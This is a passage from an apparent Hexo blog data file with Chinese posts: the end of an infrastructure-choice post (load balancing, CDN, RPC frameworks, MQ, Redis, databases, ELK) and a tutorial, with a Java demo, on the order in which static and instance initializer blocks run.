Nginx.</p>\n<ul>\n<li>SLB&#x8981;&#x6536;&#x94B1;&#xFF0C;&#x4F46;&#x662F;&#x6BD4;&#x8F83;&#x4FBF;&#x5B9C;&#xFF0C;&#x6709;&#x4FDD;&#x8BC1;&#xFF0C;&#x4E0D;&#x4F1A;&#x6302;&#x3002; &#x4F46;&#x662F;&#x53EF;&#x914D;&#x7F6E;&#x7684;&#x5F88;&#x5C11;&#xFF0C;&#x4E0D;&#x80FD;&#x6839;&#x636E;&#x57DF;&#x540D;&#x505A;ip&#x6620;&#x5C04;</li>\n<li>Nginx, &#x6CA1;&#x5565;&#x7F3A;&#x70B9;&#xFF0C;&#x9700;&#x8981;&#x4E00;&#x5B9A;&#x7684;&#x77E5;&#x8BC6;&#x3002;<br>&#x5EFA;&#x8BAE;&#xFF1A; SLB + Nginx, SLB&#x7ED1;&#x5B9A;&#x57DF;&#x540D;&#x4F5C;&#x4E3A;&#x7EDF;&#x4E00;&#x7684;&#x5165;&#x53E3;&#xFF0C;&#x7136;&#x540E;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x518D;&#x642D;&#x5EFA;Nginx.</li>\n</ul>\n<h4 id=\"CDN\"><a href=\"#CDN\" class=\"headerlink\" title=\"CDN\"></a>CDN</h4><p>&#x7528;&#x4E8E;&#x7F13;&#x5B58;&#x9759;&#x6001;&#x6587;&#x4EF6;&#x7B49;&#x7B49;&#x3002; &#x4E03;&#x725B;&#x548C;&#x963F;&#x91CC;&#x7684;&#x90FD;&#x8FD8;&#x53EF;&#x4EE5;&#x3002;</p>\n<ul>\n<li>&#x4E03;&#x725B;&#x8981;&#x505A;&#x7684;&#x4E45;&#x4E00;&#x70B9;&#xFF0C; &#x5404;&#x79CD;&#x56FE;&#x7247;&#x5904;&#x7406;&#x7684;&#x63A5;&#x53E3;&#x8981;&#x5B8C;&#x5584;&#x4E00;&#x4E9B;</li>\n<li>&#x963F;&#x91CC;&#x7684;CDN&#x8981;&#x7A0D;&#x5FAE;&#x597D;&#x4E00;&#x70B9;&#x70B9;&#xFF0C; &#x4F46;&#x662F;&#x6CA1;&#x6709;&#x4E0D;&#x5B89;&#x5168;&#x7684;&#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#xFF0C;&#x8BBF;&#x95EE;&#x7A0D;&#x5FAE;&#x6CA1;&#x6709;&#x90A3;&#x4E48;&#x7075;&#x6D3B;&#x3002; &#x56FE;&#x7247;&#x5904;&#x7406;&#x529F;&#x80FD;&#x5F31;&#x4E00;&#x70B9;&#x3002;</li>\n</ul>\n<h4 id=\"&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;\"><a href=\"#&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;\" class=\"headerlink\" title=\"&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;\"></a>&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;</h4><p>&#x76EE;&#x524D;&#x53EF;&#x9009;&#x7684;&#x6709;ZK + dubbo. ZK + Motan, ZK + dubbox, edas&#x3002;</p>\n<ul>\n<li>dubbo, &#x963F;&#x91CC;&#x7684;&#x670D;&#x52A1;&#x6CBB;&#x7406;&#x6846;&#x67B6;&#xFF0C;&#x5DF2;&#x7ECF;&#x4E0D;&#x7EF4;&#x62A4;&#x4E86;&#xFF0C;&#x5207;&#x6362;&#x53CD;&#x5E94;&#x6709;&#x70B9;&#x6162;</li>\n<li>dubboX, &#x5F53;&#x5F53;&#x57FA;&#x4E8E;dubbo&#x641E;&#x7684;&#xFF0C;&#x8FD8;&#x5728;&#x7EF4;&#x62A4;&#x53EF;&#x4EE5;&#x4E00;&#x7528;&#xFF0C;&#x63A8;&#x8350;&#x3002;</li>\n<li>Motan, &#x5FAE;&#x535A;&#x7684;&#x670D;&#x52A1;&#x6CBB;&#x7406;&#x77FF;&#x5EFA;&#xFF0C; &#x521A;&#x5F00;&#x6E90;&#xFF0C;&#x9700;&#x8981;&#x5B66;&#x4E60;&#x4E00;&#x4E0B;&#xFF0C; &#x63A8;&#x8350;&#x3002;</li>\n<li>Edas, &#x963F;&#x91CC;&#x4E91;&#x670D;&#x52A1;&#xFF0C;&#x8981;&#x6536;&#x94B1;&#xFF0C;&#x4FB5;&#x5165;&#x578B;&#x5F88;&#x5F3A;&#xFF0C;&#x4E0D;&#x63A8;&#x8350;</li>\n</ul>\n<h4 id=\"MQ\"><a href=\"#MQ\" class=\"headerlink\" title=\"MQ\"></a>MQ</h4><p>&#x53EF;&#x9009;&#x7684;&#x6709;&#xFF1A; ActiveMQ, &#x963F;&#x91CC;&#x4E91;&#x6D88;&#x606F;&#xFF0C; robbitMQ,<br>&#x5404;&#x6709;&#x597D;&#x5904;&#xFF0C; &#x4F46;&#x662F;&#x8003;&#x8651;&#x5230;&#x8FD0;&#x7EF4;&#x7684;&#x96BE;&#x5EA6;&#xFF0C;&#x63A8;&#x8350;&#x963F;&#x91CC;&#x4E91;&#x6D88;&#x606F;&#x3002;</p>\n<h4 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h4><p>&#x7528;&#x6765;&#x505A;&#x7F13;&#x5B58;&#xFF0C; &#x81EA;&#x5EFA;&#x6210;&#x672C;&#x6709;&#x70B9;&#x9AD8;&#xFF0C;&#x9700;&#x8981;Codis, &#x5206;&#x7247;&#xFF0C;&#x96C6;&#x7FA4;&#xFF0C;&#x4E3B;&#x4ECE;&#x7B49;&#x7B49;&#xFF0C;&#x5F88;&#x9EBB;&#x70E6;&#x3002; &#x5EFA;&#x8BAE;&#x76F4;&#x63A5;&#x7528;&#x963F;&#x91CC;&#x7684;</p>\n<h4 id=\"&#x6570;&#x636E;&#x5E93;\"><a href=\"#&#x6570;&#x636E;&#x5E93;\" class=\"headerlink\" title=\"&#x6570;&#x636E;&#x5E93;\"></a>&#x6570;&#x636E;&#x5E93;</h4><p>&#x4E3B;&#x8981;&#x57FA;&#x4E8E;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x548C;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8003;&#x8651;&#xFF0C;&#x76EE;&#x524D;&#x53EF;&#x4EE5;&#x81EA;&#x5EFA;&#x548C;&#x9009;&#x7528;&#x963F;&#x91CC;&#x7684;DRDS&#x3002;</p>\n<ul>\n<li>DRDS &#x8981;&#x82B1;&#x94B1;&#xFF0C;&#x6210;&#x672C;&#x8F83;&#x9AD8;&#xFF0C;&#x6CA1;&#x6709;&#x5FC5;&#x8981;</li>\n<li>&#x81EA;&#x5EFA;&#xFF0C;  &#x4E0D;&#x7528;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;1&#x5199;2&#x53EA;&#x8BFB;&#xFF0C; &#x7136;&#x540E;&#x914D;&#x7F6E;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x7684;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x5185;&#x7F51;SLB&#x8FDB;&#x884C;&#x8BFB;&#x96C6;&#x7FA4;&#x3002;&#x89E3;&#x51B3;&#x4E4B;&#x3002;</li>\n</ul>\n<h4 id=\"&#x641C;&#x7D22;\"><a href=\"#&#x641C;&#x7D22;\" class=\"headerlink\" title=\"&#x641C;&#x7D22;\"></a>&#x641C;&#x7D22;</h4><p>&#x5EFA;&#x8BAE;ELK&#xFF0C; &#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x540C;&#x6B65;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x9664;&#x4E86;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x7684;&#x529F;&#x80FD;&#x5916;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x505A;&#x65E5;&#x5FD7;&#x641C;&#x7D22;&#xFF0C;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x3002;</p>\n<h4 id=\"&#x4E00;&#x4E9B;&#x5178;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x8BF4;&#x660E;\"><a href=\"#&#x4E00;&#x4E9B;&#x5178;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x8BF4;&#x660E;\" class=\"headerlink\" title=\"&#x4E00;&#x4E9B;&#x5178;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x8BF4;&#x660E;\"></a>&#x4E00;&#x4E9B;&#x5178;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x8BF4;&#x660E;</h4><p>&#x628A;&#x4E1A;&#x52A1;&#x5E95;&#x5C42;&#x505A;&#x6210;SOA&#x6A21;&#x5757;&#xFF0C;&#x901A;&#x8FC7;&#x5206;&#x5E03;&#x5F0F;&#x8C03;&#x7528;&#x6846;&#x67B6;&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x670D;&#x52A1;&#x3002;<br>&#x5355;&#x72EC;&#x505A;&#x4E00;&#x4E2A;&#x5C0F;&#x7684;&#x7CFB;&#x7EDF;&#x6765;&#x8FD0;&#x884C;&#x5B9A;&#x65F6;&#x4EFB;&#x52A1;<br>&#x70ED;&#x70B9;&#x6570;&#x636E;&#x653E;&#x7F13;&#x5B58;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;MQ&#x6765;&#x66F4;&#x65B0;&#x7F13;&#x5B58;<br>&#x65E5;&#x5FD7;&#x7B49;&#x6570;&#x636E;&#x6709;&#x5FC5;&#x8981;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x4E0A;&#x4E2A;Mongo</p>\n<p><br></p>"},{"title":"初始化块和静态初始化块的区别","date":"2016-06-06T15:42:00.000Z","toc":false,"_content":"\n### 最近被初始化快和静态初始化快整懵了，现整理如下：\n\n** ps: 大学时的ppt课件都被我翻出来了 (^∇^*) **\n** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不看前面内容，我写在本文最后的那道测试题绝对让大部分人懵逼 <(￣︶￣)>**\n\n![图片1-初始化快](http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/1.png)\n![图片2-静态初始化快](http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/2.png)\n<!-- more -->\n![图片3-执行顺序](http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/3.png)\n\n\n### 测试代码\n#### 1、static初始化块\n**static初始化块是在构造函数之前执行的，而且只执行一次，即类首次加载时。**\n\n测试代码：\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/4.png)\n\n#### 2、初始化块<(￣︶￣)>\n测试代码：\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/5.png)\n\n原代码：\n```\npackage dem;\n\npublic class A extends B {\n\tpublic A() {\n\t\tSystem.out.println(\"A构造方法\");\n\t}\n\n\tstatic {\n\t\tSystem.out.println(\"A静态初始化块\");\n\t}\n\n\t{\n\t\tSystem.out.println(\"A初始化块\");\n\t}\n\n\tpublic static void main(String[] args) {\n\t\tnew A();\n\t\tSystem.out.println(\"--------\");\n\t\tnew A();\n\t}\n}\n\nclass B {\n\tpublic B() {\n\t\tSystem.out.println(\"B构造方法\");\n\t}\n\n\tstatic {\n\t\tSystem.out.println(\"B静态初始化块\");\n\t}\n\n\t{\n\t\tSystem.out.println(\"B初始化块\");\n\t}\n}\n\n```\n\n","source":"_posts/初始化块和静态初始化块的区别.md","raw":"---\ntitle: 初始化块和静态初始化块的区别\ncategories:\n  - WEB后端\ntags:\n  - 初始化块\n  - 疑难杂症\ndate: 2016-6-6 23:42:00\ntoc: false\n---\n\n### 最近被初始化快和静态初始化快整懵了，现整理如下：\n\n** ps: 大学时的ppt课件都被我翻出来了 (^∇^*) **\n** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不看前面内容，我写在本文最后的那道测试题绝对让大部分人懵逼 <(￣︶￣)>**\n\n![图片1-初始化快](http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/1.png)\n![图片2-静态初始化快](http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/2.png)\n<!-- more -->\n![图片3-执行顺序](http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/3.png)\n\n\n### 测试代码\n#### 1、static初始化块\n**static初始化块是在构造函数之前执行的，而且只执行一次，即类首次加载时。**\n\n测试代码：\n![图片4](http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/4.png)\n\n#### 2、初始化块<(￣︶￣)>\n测试代码：\n![图片5](http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/5.png)\n\n原代码：\n```\npackage dem;\n\npublic class A extends B {\n\tpublic A() {\n\t\tSystem.out.println(\"A构造方法\");\n\t}\n\n\tstatic {\n\t\tSystem.out.println(\"A静态初始化块\");\n\t}\n\n\t{\n\t\tSystem.out.println(\"A初始化块\");\n\t}\n\n\tpublic static void main(String[] args) {\n\t\tnew A();\n\t\tSystem.out.println(\"--------\");\n\t\tnew A();\n\t}\n}\n\nclass B {\n\tpublic B() {\n\t\tSystem.out.println(\"B构造方法\");\n\t}\n\n\tstatic {\n\t\tSystem.out.println(\"B静态初始化块\");\n\t}\n\n\t{\n\t\tSystem.out.println(\"B初始化块\");\n\t}\n}\n\n```\n\n","slug":"初始化块和静态初始化块的区别","published":1,"updated":"2016-11-17T11:59:42.680Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruleb004ggwtm1fv0cj2d","content":"<h3 id=\"&#x6700;&#x8FD1;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x548C;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x6574;&#x61F5;&#x4E86;&#xFF0C;&#x73B0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;\"><a href=\"#&#x6700;&#x8FD1;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x548C;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x6574;&#x61F5;&#x4E86;&#xFF0C;&#x73B0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;\" class=\"headerlink\" title=\"&#x6700;&#x8FD1;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x548C;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x6574;&#x61F5;&#x4E86;&#xFF0C;&#x73B0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;\"></a>&#x6700;&#x8FD1;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x548C;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x6574;&#x61F5;&#x4E86;&#xFF0C;&#x73B0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;</h3><p><strong> ps: &#x5927;&#x5B66;&#x65F6;&#x7684;ppt&#x8BFE;&#x4EF6;&#x90FD;&#x88AB;&#x6211;&#x7FFB;&#x51FA;&#x6765;&#x4E86; (^&#x2207;^*) </strong><br><strong> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#x4E0D;&#x770B;&#x524D;&#x9762;&#x5185;&#x5BB9;&#xFF0C;&#x6211;&#x5199;&#x5728;&#x672C;&#x6587;&#x6700;&#x540E;&#x7684;&#x90A3;&#x9053;&#x6D4B;&#x8BD5;&#x9898;&#x7EDD;&#x5BF9;&#x8BA9;&#x5927;&#x90E8;&#x5206;&#x4EBA;&#x61F5;&#x903C; &lt;(&#xFFE3;&#xFE36;&#xFFE3;)&gt;</strong></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/1.png\" alt=\"&#x56FE;&#x7247;1-&#x521D;&#x59CB;&#x5316;&#x5FEB;\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/2.png\" alt=\"&#x56FE;&#x7247;2-&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5FEB;\"><br><a id=\"more\"></a><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/3.png\" alt=\"&#x56FE;&#x7247;3-&#x6267;&#x884C;&#x987A;&#x5E8F;\"></p>\n<h3 id=\"&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;\"><a href=\"#&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;\" class=\"headerlink\" title=\"&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;\"></a>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;</h3><h4 id=\"1&#x3001;static&#x521D;&#x59CB;&#x5316;&#x5757;\"><a href=\"#1&#x3001;static&#x521D;&#x59CB;&#x5316;&#x5757;\" class=\"headerlink\" title=\"1&#x3001;static&#x521D;&#x59CB;&#x5316;&#x5757;\"></a>1&#x3001;static&#x521D;&#x59CB;&#x5316;&#x5757;</h4><p><strong>static&#x521D;&#x59CB;&#x5316;&#x5757;&#x662F;&#x5728;&#x6784;&#x9020;&#x51FD;&#x6570;&#x4E4B;&#x524D;&#x6267;&#x884C;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x53EA;&#x6267;&#x884C;&#x4E00;&#x6B21;&#xFF0C;&#x5373;&#x7C7B;&#x9996;&#x6B21;&#x52A0;&#x8F7D;&#x65F6;&#x3002;</strong></p>\n<p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<h4 id=\"2&#x3001;&#x521D;&#x59CB;&#x5316;&#x5757;-lt-&#xFFE3;&#xFE36;&#xFFE3;-gt\"><a href=\"#2&#x3001;&#x521D;&#x59CB;&#x5316;&#x5757;-lt-&#xFFE3;&#xFE36;&#xFFE3;-gt\" class=\"headerlink\" title=\"2&#x3001;&#x521D;&#x59CB;&#x5316;&#x5757;&lt;(&#xFFE3;&#xFE36;&#xFFE3;)&gt;\"></a>2&#x3001;&#x521D;&#x59CB;&#x5316;&#x5757;&lt;(&#xFFE3;&#xFE36;&#xFFE3;)&gt;</h4><p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/5.png\" alt=\"&#x56FE;&#x7247;5\"></p>\n<p>&#x539F;&#x4EE3;&#x7801;&#xFF1A;<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package dem;</span><br><span class=\"line\"></span><br><span class=\"line\">public class A extends B {</span><br><span class=\"line\">\tpublic A() {</span><br><span class=\"line\">\t\tSystem.out.println(&quot;A&#x6784;&#x9020;&#x65B9;&#x6CD5;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tstatic {</span><br><span class=\"line\">\t\tSystem.out.println(&quot;A&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5757;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t{</span><br><span class=\"line\">\t\tSystem.out.println(&quot;A&#x521D;&#x59CB;&#x5316;&#x5757;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic static void main(String[] args) {</span><br><span class=\"line\">\t\tnew A();</span><br><span class=\"line\">\t\tSystem.out.println(&quot;--------&quot;);</span><br><span class=\"line\">\t\tnew A();</span><br><span class=\"line\">\t}</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\">class B {</span><br><span class=\"line\">\tpublic B() {</span><br><span class=\"line\">\t\tSystem.out.println(&quot;B&#x6784;&#x9020;&#x65B9;&#x6CD5;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tstatic {</span><br><span class=\"line\">\t\tSystem.out.println(&quot;B&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5757;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t{</span><br><span class=\"line\">\t\tSystem.out.println(&quot;B&#x521D;&#x59CB;&#x5316;&#x5757;&quot;);</span><br><span class=\"line\">\t}</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<h3 id=\"&#x6700;&#x8FD1;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x548C;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x6574;&#x61F5;&#x4E86;&#xFF0C;&#x73B0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;\"><a href=\"#&#x6700;&#x8FD1;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x548C;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x6574;&#x61F5;&#x4E86;&#xFF0C;&#x73B0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;\" class=\"headerlink\" title=\"&#x6700;&#x8FD1;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x548C;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x6574;&#x61F5;&#x4E86;&#xFF0C;&#x73B0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;\"></a>&#x6700;&#x8FD1;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x548C;&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5FEB;&#x6574;&#x61F5;&#x4E86;&#xFF0C;&#x73B0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;</h3><p><strong> ps: &#x5927;&#x5B66;&#x65F6;&#x7684;ppt&#x8BFE;&#x4EF6;&#x90FD;&#x88AB;&#x6211;&#x7FFB;&#x51FA;&#x6765;&#x4E86; (^&#x2207;^*) </strong><br><strong> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#x4E0D;&#x770B;&#x524D;&#x9762;&#x5185;&#x5BB9;&#xFF0C;&#x6211;&#x5199;&#x5728;&#x672C;&#x6587;&#x6700;&#x540E;&#x7684;&#x90A3;&#x9053;&#x6D4B;&#x8BD5;&#x9898;&#x7EDD;&#x5BF9;&#x8BA9;&#x5927;&#x90E8;&#x5206;&#x4EBA;&#x61F5;&#x903C; &lt;(&#xFFE3;&#xFE36;&#xFFE3;)&gt;</strong></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/1.png\" alt=\"&#x56FE;&#x7247;1-&#x521D;&#x59CB;&#x5316;&#x5FEB;\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/2.png\" alt=\"&#x56FE;&#x7247;2-&#x9759;&#x6001;&#x521D;&#x59CB;&#x5316;&#x5FEB;\"><br></p>","more":"<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/3.png\" alt=\"&#x56FE;&#x7247;3-&#x6267;&#x884C;&#x987A;&#x5E8F;\"><p></p>\n<h3 id=\"&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;\"><a href=\"#&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;\" class=\"headerlink\" title=\"&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;\"></a>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;</h3><h4 id=\"1&#x3001;static&#x521D;&#x59CB;&#x5316;&#x5757;\"><a href=\"#1&#x3001;static&#x521D;&#x59CB;&#x5316;&#x5757;\" class=\"headerlink\" title=\"1&#x3001;static&#x521D;&#x59CB;&#x5316;&#x5757;\"></a>1&#x3001;static&#x521D;&#x59CB;&#x5316;&#x5757;</h4><p><strong>static&#x521D;&#x59CB;&#x5316;&#x5757;&#x662F;&#x5728;&#x6784;&#x9020;&#x51FD;&#x6570;&#x4E4B;&#x524D;&#x6267;&#x884C;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x53EA;&#x6267;&#x884C;&#x4E00;&#x6B21;&#xFF0C;&#x5373;&#x7C7B;&#x9996;&#x6B21;&#x52A0;&#x8F7D;&#x65F6;&#x3002;</strong></p>\n<p>&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<h4 id=\"2&#x3001;&#x521D;&#x59CB;&#x5316;&#x5757;-lt-&#xFFE3;&#xFE36;&#xFFE3;-gt\"><a 